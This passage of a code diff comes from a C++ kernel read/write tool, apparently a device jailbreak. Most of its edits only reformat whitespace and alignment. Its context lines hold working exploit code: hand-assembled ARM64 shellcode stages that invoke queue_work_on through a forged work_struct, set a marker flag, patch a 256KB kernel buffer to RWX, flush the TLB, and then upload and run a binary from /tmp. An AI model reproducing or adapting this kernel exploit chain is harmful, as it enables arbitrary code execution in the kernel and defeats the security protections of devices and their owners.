             0x61, 0x01, 0x00, 0x58,  // 0x2C: LDR X1, pc+44 (Loads addr_debug_flag from 0x58)
             0x22, 0x00, 0x00, 0xF9,  // 0x30: STR X2, [X1]
             // ---------------------------------
-            
+
             0x00, 0x00, 0x80, 0xD2,  // 0x34: MOV X0, #0
             0xFD, 0x7B, 0xC1, 0xA8,  // 0x38: LDP X29, X30, [SP], #0x10
             0xC0, 0x03, 0x5F, 0xD6,  // 0x3C: RET
             0x1F, 0x20, 0x03, 0xD5,  // 0x40: NOP (Align)
             0x1F, 0x20, 0x03, 0xD5   // 0x44: NOP (Align)
         };
-        pack_q(stage2_sc, __vmalloc_addr);    // 0x48
-        pack_q(stage2_sc, addr_alloc_ptr);    // 0x50
-        pack_q(stage2_sc, addr_debug_flag);   // 0x58
+        pack_q(stage2_sc, __vmalloc_addr);   // 0x48
+        pack_q(stage2_sc, addr_alloc_ptr);   // 0x50
+        pack_q(stage2_sc, addr_debug_flag);  // 0x58
         payload.insert(payload.end(), stage2_sc.begin(), stage2_sc.end());
 
-        uint64_t WORK_STRUCT_NO_POOL = 0x0FFFFFFFE0; 
-        uint64_t entry_addr = addr_work_struct + 0x08; 
-        pack_q(payload, WORK_STRUCT_NO_POOL); // 0x60
-        pack_q(payload, entry_addr);          // 0x68
-        pack_q(payload, entry_addr);          // 0x70
-        pack_q(payload, addr_worker);         // 0x78
+        uint64_t WORK_STRUCT_NO_POOL = 0x0FFFFFFFE0;
+        uint64_t entry_addr = addr_work_struct + 0x08;
+        pack_q(payload, WORK_STRUCT_NO_POOL);  // 0x60
+        pack_q(payload, entry_addr);           // 0x68
+        pack_q(payload, entry_addr);           // 0x70
+        pack_q(payload, addr_worker);          // 0x78
 
         std::vector<uint8_t> stage1_sc = {
             0xFD, 0x7B, 0xBF, 0xA9,  // 0x00: STP X29, X30, [SP, #-0x10]!
-            
+
             // Flush Cache Line 1, 2 & 3
             0xA4, 0x02, 0x00, 0x58,  // 0x04: LDR X4, pc+84 (Loads addr_worker from 0xD8)
             0x24, 0x7B, 0x0B, 0xD5,  // 0x08: DC CVAU, X4
@@ -1004,22 +970,22 @@ bool KernelRW::setup_jb_env() {
             0x24, 0x75, 0x0B, 0xD5,  // 0x24: IC IVAU, X4
             0x9F, 0x3B, 0x03, 0xD5,  // 0x28: DSB ISH
             0xDF, 0x3F, 0x03, 0xD5,  // 0x2C: ISB
-            
+
             0x80, 0x00, 0x80, 0x52,  // 0x30: MOV W0, #4 (WORK_CPU_UNBOUND)
             0x61, 0x01, 0x00, 0x58,  // 0x34: LDR X1, pc+44 (Loads SYSTEM_WQ from 0xE0)
             0x21, 0x00, 0x40, 0xF9,  // 0x38: LDR X1, [X1]  (Deref system_wq)
             0x62, 0x01, 0x00, 0x58,  // 0x3C: LDR X2, pc+44 (Loads addr_work_struct from 0xE8)
             0x83, 0x01, 0x00, 0x58,  // 0x40: LDR X3, pc+48 (Loads QUEUE_WORK_ON from 0xF0)
-            0x60, 0x00, 0x3F, 0xD6,  // 0x44: BLR X3 
+            0x60, 0x00, 0x3F, 0xD6,  // 0x44: BLR X3
             0x00, 0x00, 0x80, 0xD2,  // 0x48: MOV X0, #0
             0xFD, 0x7B, 0xC1, 0xA8,  // 0x4C: LDP X29, X30, [SP], #0x10
             0xC0, 0x03, 0x5F, 0xD6,  // 0x50: RET
             0x1F, 0x20, 0x03, 0xD5   // 0x54: NOP (Align)
         };
-        pack_q(stage1_sc, addr_worker);              // 0x58 -> 0xD8
-        pack_q(stage1_sc, constants::SYSTEM_WQ);     // 0x60 -> 0xE0
-        pack_q(stage1_sc, addr_work_struct);         // 0x68 -> 0xE8
-        pack_q(stage1_sc, constants::QUEUE_WORK_ON); // 0x70 -> 0xF0
+        pack_q(stage1_sc, addr_worker);               // 0x58 -> 0xD8
+        pack_q(stage1_sc, constants::SYSTEM_WQ);      // 0x60 -> 0xE0
+        pack_q(stage1_sc, addr_work_struct);          // 0x68 -> 0xE8
+        pack_q(stage1_sc, constants::QUEUE_WORK_ON);  // 0x70 -> 0xF0
         payload.insert(payload.end(), stage1_sc.begin(), stage1_sc.end());
 
         LOG_DEBUG << "[*] Writing unified payload (0x" << std::hex << payload.size() << " bytes)...\n";
@@ -1045,14 +1011,14 @@ bool KernelRW::setup_jb_env() {
                 break;
             }
         }
-        
+
         if (debug_flag == 0x1337 && rwx_base != 0) {
             LOG_DEBUG << "[+] 256KB RWX Buffer natively allocated at: 0x" << std::hex << rwx_base << "\n";
             patch_rwx(rwx_base, 0x40000);
             execute_tlb_flush();
 
             write_u64_fast(constants::TEXT_ALLOC_BASE, rwx_base);
-            
+
             // Upload and execute vr2bridge
             upload_to_tmp(Utils::get_executable_relative_path("vr2bridge"), "vr2bridge");
             execute_elf("/tmp/vr2bridge", {});
